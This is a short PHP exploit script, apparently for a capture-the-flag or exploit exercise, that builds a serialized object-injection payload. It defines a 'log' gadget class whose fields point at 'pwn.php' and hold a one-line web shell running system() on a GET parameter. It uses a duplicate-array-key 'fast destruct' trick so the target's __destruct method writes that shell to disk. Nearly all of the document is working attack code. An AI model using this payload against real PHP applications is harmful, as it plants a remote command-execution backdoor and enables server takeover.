<?php

# helper function
const FAST_DESTRUCT_TEMP_KEY = 7896543210;
const FAST_DESTRUCT_FINAL_KEY = 7;
function process_object($object)
{
        $key = FAST_DESTRUCT_TEMP_KEY;
        return [$key => $object, $key => $key];
}

#class to be injected
class log
{
    public $logs = "pwn.php";
    public $request = '<?php system($_GET[1]); ?>';
}

$logObj = new log;
# process_object() serializes $logObj into an array with 2 items that have the same key,
# forcing our $logObj to be overwritten inside the array and calling the __destruct() magic method of the class definition
$logObj = process_object($logObj); 
$serialized = serialize($logObj);
print($serialized);

/* the source code for the class looks like this
class log
{
    public function __destruct()
        {
            $request_log = fopen($this->logs , "a");
            fwrite($request_log, $this->request);
            fwrite($request_log, "\r\n");
            fclose($request_log);
        }
}
*/

?>

